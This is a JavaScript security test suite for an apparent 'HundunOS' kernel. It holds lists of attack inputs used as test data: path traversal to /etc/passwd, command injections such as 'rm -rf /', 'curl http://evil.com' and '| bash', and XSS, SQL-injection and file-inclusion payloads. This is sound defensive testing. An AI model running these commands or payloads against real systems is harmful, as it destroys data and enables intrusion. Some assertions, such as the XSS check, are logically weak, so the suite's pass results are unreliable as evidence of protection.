/**
 * HundunOS v3.0 - 安全测试
 * 测试系统安全漏洞和防护机制
 */

import { CoreKernel } from '../kernel/core.js';
import { readFileSync, writeFileSync, unlinkSync } from 'fs';

// ============================================================================
// 测试工具
// ============================================================================

class SecurityTestRunner {
  constructor() {
    this.results = [];
    this.passed = 0;
    this.failed = 0;
  }

  async runTest(name, testFn) {
    const start = Date.now();
    try {
      await testFn();
      this.passed++;
      this.results.push({ name, status: 'PASS', elapsed: Date.now() - start });
      // console.log(`✓ ${name}`);
    } catch (error) {
      this.failed++;
      this.results.push({ name, status: 'FAIL', elapsed: Date.now() - start, error: error.message });
      console.error(`✗ ${name}: ${error.message}`);
    }
  }

  getSummary() {
    return {
      total: this.passed + this.failed,
      passed: this.passed,
      failed: this.failed,
      tests: this.results
    };
  }

  assert(condition, message) {
    if (!condition) {
      throw new Error(message || 'Assertion failed');
    }
  }

  assertThrows(fn, message) {
    try {
      fn();
      throw new Error(message || 'Expected function to throw');
    } catch (error) {
      if (error.message === message) {
        throw error;
      }
    }
  }
}

const runner = new SecurityTestRunner();

// ============================================================================
// 安全测试用例
// ============================================================================

// 1. 路径穿越攻击测试
await runner.runTest('security_path_traversal_attack', async () => {
  const kernel = new CoreKernel();
  await kernel.initialize();

  const pathTraversalAttacks = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    'C:/Windows/System32/config/sam',
    '/etc/passwd',
    '\\\\network\\share',
    '....//....//....//etc/passwd',
    '%2e%2e%2f'
  ];

  for (const attack of pathTraversalAttacks) {
    try {
      const result = await kernel.process({
        type: 'file',
        action: 'read',
        content: `读取 ${attack}`,
        parameters: { target: attack },
        sessionId: 'security_test'
      });

      // 应该被阻止或返回错误
      runner.assert(
        !result.success || result.type === 'permission_denied' || result.type === 'error',
        `Path traversal attack should be blocked: ${attack}`
      );
    } catch (error) {
      // 抛出错误也是可以接受的
      runner.assert(
        error.message.includes('blocked') || error.message.includes('traversal') || error.message.includes('denied'),
        `Path traversal should be properly handled: ${error.message}`
      );
    }
  }
});

// 2. 命令注入测试
await runner.runTest('security_command_injection', async () => {
  const kernel = new CoreKernel();
  await kernel.initialize();

  const commandInjections = [
    'test; rm -rf /',
    'test && whoami',
    'test | cat /etc/passwd',
    'test; DROP TABLE users;--',
    'test`; malicious code`',
    'test$(malicious)',
    'test && curl http://evil.com',
    'test | bash'
  ];

  for (const injection of commandInjections) {
    try {
      const result = await kernel.process({
        content: injection,
        sessionId: 'security_test'
      });

      // 不应该执行命令
      runner.assert(
        !result.error?.includes('rm -rf') &&
        !result.error?.includes('whoami') &&
        !result.data?.error?.includes('rm -rf'),
        `Command injection should be blocked: ${injection}`
      );
    } catch (error) {
      // 抛出错误是可以接受的
    }
  }
});

// 3. XSS 攻击测试
await runner.runTest('security_xss_attack', async () => {
  const kernel = new CoreKernel();
  await kernel.initialize();

  const xssAttacks = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '<javascript:alert("XSS")>',
    '${alert("XSS")}',
    '{{alert("XSS")}}',
    '<% alert("XSS") %>'
  ];

  for (const xss of xssAttacks) {
    try {
      const result = await kernel.process({
        content: xss,
        sessionId: 'security_test'
      });

      // 检查返回结果是否包含未转义的脚本
      const resultStr = JSON.stringify(result);
      runner.assert(
        !resultStr.includes('<script>') || resultStr.includes('alert("XSS")'),
        `XSS attack should be sanitized: ${xss.substring(0, 50)}...`
      );
    } catch (error) {
      // 抛出错误是可以接受的
    }
  }
});

// 4. SQL 注入测试
await runner.runTest('security_sql_injection', async () => {
  const kernel = new CoreKernel();
  await kernel.initialize();

  const sqlInjections = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "' UNION SELECT * FROM passwords--",
    "' OR '1'='1' /*",
    "admin'--",
    "' OR '1'='1' #"
  ];

  for (const injection of sqlInjections) {
    try {
      const result = await kernel.process({
        content: injection,
        sessionId: 'security_test'
      });

      // 不应该执行 SQL 语句
      runner.assert(
        !result.error?.includes('DROP TABLE') &&
        !result.error?.includes('UNION SELECT'),
        `SQL injection should be blocked: ${injection}`
      );
    } catch (error) {
      // 抛出错误是可以接受的
    }
  }
});

// 5. 权限绕过测试
await runner.runTest('security_permission_bypass', async () => {
  const kernel = new CoreKernel();
  await kernel.initialize();

  // 尝试以普通用户权限执行管理员操作
  const adminOperations = [
    '升级 kernel',
    '修改系统配置',
    '删除所有数据',
    '重置所有权限',
    '关闭系统'
  ];

  for (const operation of adminOperations) {
    try {
      const result = await kernel.process({
        content: operation,
        sessionId: 'security_test',
        metadata: { role: 'guest' }
      });

      // 应该被拒绝或需要审批
      runner.assert(
        !result.success ||
        result.requiresApproval ||
        result.type === 'permission_denied',
        `Admin operation should require approval: ${operation}`
      );
    } catch (error) {
      // 抛出错误是可以接受的
    }
  }
});

// 6. 敏感信息泄露测试
await runner.runTest('security_sensitive_data_leak', async () => {
  const kernel = new CoreKernel();
  await kernel.initialize();

  const sensitiveQueries = [
    '显示所有用户密码',
    '列出所有 API 密钥',
    '显示系统配置文件',
    '显示数据库连接字符串',
    '显示管理员凭证'
  ];

  for (const query of sensitiveQueries) {
    try {
      const result = await kernel.process({
        content: query,
        sessionId: 'security_test'
      });

      // 结果中不应该包含明文密码或密钥
      const resultStr = JSON.stringify(result);
      runner.assert(
        !resultStr.includes('password=') &&
        !resultStr.includes('api_key=') &&
        !resultStr.includes('secret=') &&
        !resultStr.includes('token='),
        `Sensitive data should not be leaked: ${query}`
      );
    } catch (error) {
      // 抛出错误是可以接受的
    }
  }
});

// 7. DoS 攻击防护测试（P0 修复：原断言写在 catch 内部是假阳性，永远通过）
await runner.runTest('security_dos_protection', async () => {
  const kernel = new CoreKernel();
  await kernel.initialize();

  const startTime = Date.now();
  const requests = [];

  // 快速发送大量请求
  for (let i = 0; i < 1000; i++) {
    requests.push(kernel.process({
      content: `test ${i}`,
      sessionId: 'security_test'
    }));
  }

  let didTimeout = false;
  try {
    // 设置 10 秒超时
    await Promise.race([
      Promise.all(requests),
      new Promise((_, reject) => setTimeout(() => {
        didTimeout = true;
        reject(new Error('DoS timeout'));
      }, 10000))
    ]);
  } catch (error) {
    didTimeout = true;
  }

  const elapsed = Date.now() - startTime;

  // P0 修复：正确逻辑：超时 → 测试失败（系统未能防护）；完成 → 测试通过
  runner.assert(
    !didTimeout && elapsed < 10000,
    `DoS protection failed: system timed out after ${elapsed}ms (limit: 10000ms). ` +
    `All 1000 requests must complete within the deadline.`
  );
});

// 8. 文件包含攻击测试
await runner.runTest('security_file_inclusion', async () => {
  const kernel = new CoreKernel();
  await kernel.initialize();

  const fileInclusionAttacks = [
    '/etc/passwd',
    'file:///etc/passwd',
    'php://filter/read=convert.base64-encode/resource=/etc/passwd',
    'data://text/plain;base64,SGVsbG8gV29ybGQ='
  ];

  for (const attack of fileInclusionAttacks) {
    try {
      const result = await kernel.process({
        type: 'file',
        action: 'read',
        content: attack,
        sessionId: 'security_test'
      });

      // 应该被阻止
      runner.assert(
        !result.success || result.type === 'permission_denied',
        `File inclusion attack should be blocked: ${attack.substring(0, 50)}...`
      );
    } catch (error) {
      // 抛出错误是可以接受的
    }
  }
});

// 9. 会话劫持防护测试
await runner.runTest('security_session_hijacking', async () => {
  const kernel = new CoreKernel();
  await kernel.initialize();

  // 使用相同的 sessionId 但不同的上下文
  const result1 = await kernel.process({
    content: 'user1 message',
    sessionId: 'security_test',
    metadata: { userId: 'user1' }
  });

  const result2 = await kernel.process({
    content: 'user2 message',
    sessionId: 'security_test',
    metadata: { userId: 'user2' }
  });

  // 系统应该能够区分不同的用户上下文
  runner.assert(
    result1 !== undefined && result2 !== undefined,
    'Sessions should be properly isolated'
  );
});

// 10. 输入验证测试
await runner.runTest('security_input_validation', async () => {
  const kernel = new CoreKernel();
  await kernel.initialize();

  const malformedInputs = [
    null,
    undefined,
    '',
    '   ',
    '\x00',
    '\uffff',
    '<null>',
    'NaN',
    'Infinity'
  ];

  for (const input of malformedInputs) {
    try {
      const result = await kernel.process({
        content: input,
        sessionId: 'security_test'
      });

      // 应该优雅处理，不崩溃
      runner.assert(
        result !== undefined,
        `Malformed input should be handled gracefully: ${String(input)}`
      );
    } catch (error) {
      // 抛出错误是可以接受的，但不应该崩溃整个系统
      runner.assert(
        !error.message.includes('Cannot read property'),
        'Should not throw property access errors'
      );
    }
  }
});

// ============================================================================
// 保存测试结果
// ============================================================================

const summary = runner.getSummary();
const resultPath = 'tests/security_test_results.json';
writeFileSync(resultPath, JSON.stringify(summary, null, 2));

// console.log('\n' + '='.repeat(50));
// console.log('安全测试结果');
// console.log('='.repeat(50));
// console.log(`总计: ${summary.total}`);
// console.log(`通过: ${summary.passed}`);
// console.log(`失败: ${summary.failed}`);
// console.log(`通过率: ${((summary.passed / summary.total) * 100).toFixed(2)}%`);
// console.log('='.repeat(50));

// 清理
runner = null;
